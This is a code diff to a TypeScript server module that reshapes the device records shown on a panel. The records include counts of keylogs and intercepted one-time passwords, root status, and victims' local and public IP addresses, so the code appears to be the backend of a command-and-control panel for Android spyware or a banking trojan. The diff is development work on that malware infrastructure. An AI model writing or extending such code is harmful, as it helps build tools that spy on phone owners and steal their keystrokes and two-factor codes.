@@ -5,6 +5,11 @@ import { devices, type DeviceRow } from '../db/schema.js';
 
 const counters = new Map<string, { keys: number; otps: number }>();
 
+/** Format a DB real (number) as the string the panel expects. */
+function numToStr(n: number): string {
+  return Number.isInteger(n) ? String(n) : n.toFixed(1);
+}
+
 export interface DeviceUpsert {
   id: string;
   name?: string;
@@ -98,11 +103,9 @@ export function listDeviceSummaries(): DeviceSummary[] {
       name: r.name,
       model: r.model,
       android: r.android,
-      carrier: r.carrier,
-      signal: r.signal,
-      battery: r.battery,
       status: r.status as DeviceStatus,
-      city: r.city,
+      battery: r.battery,
+      signal: r.signal,
       keylogCount: c.keys,
       otpCount: c.otps,
       lastSeen: r.lastSeen,
@@ -119,26 +122,21 @@ export function getDeviceById(id: string): DeviceInfo | null {
     id: r.id,
     name: r.name,
     model: r.model,
-    manufacturer: r.manufacturer,
+    brand: r.manufacturer,
     android: r.android,
     sdk: r.sdk,
+    rooted: r.rooted,
+    lastSeen: r.lastSeen,
+    battery: r.battery,
+    temperature: r.temp,
+    ramFree: numToStr(Math.max(0, r.ramTotal - r.ramUsed)),
+    storageFree: numToStr(r.storageFree),
     carrier: r.carrier,
     signal: r.signal,
-    battery: r.battery,
-    temp: r.temp,
-    ramUsed: r.ramUsed,
-    ramTotal: r.ramTotal,
-    storageFree: r.storageFree,
-    storageTotal: r.storageTotal,
-    ipLocal: r.ipLocal,
-    ipPublic: r.ipPublic,
-    city: r.city,
-    skin: r.skin,
-    rooted: r.rooted,
-    status: r.status as DeviceStatus,
-    reconnectAttempts: r.reconnectAttempts,
-    firstSeen: r.firstSeen,
-    lastSeen: r.lastSeen,
+    localIp: r.ipLocal,
+    publicIp: r.ipPublic,
+    keylogCount: c.keys,
+    otpCount: c.otps,
   };
 }
 
